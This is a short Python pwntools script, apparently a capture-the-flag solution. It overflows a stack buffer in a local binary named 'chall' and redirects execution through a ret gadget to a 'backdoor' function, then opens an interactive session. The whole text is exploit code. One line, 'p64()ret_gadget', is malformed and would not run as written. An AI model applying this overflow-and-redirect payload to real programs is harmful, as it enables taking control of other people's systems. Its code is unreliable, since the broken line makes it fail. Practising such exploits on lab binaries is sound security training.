from pwn import *

context.binary = './chall'
context.log_level = 'info'

backdoor = 0x4011e7
ret_gadget = 0x401016

io = process('./chall')

log.info(f"Target: {hex(backdoor)}")
log.info(f"Alignment Gadget: {hex(ret_gadget)}")

payload = b"A" * 40
payload += p64()ret_gadget
payload += p64(backdoor)

io.sendlineafter(b"developers:", payload)

io.interactive()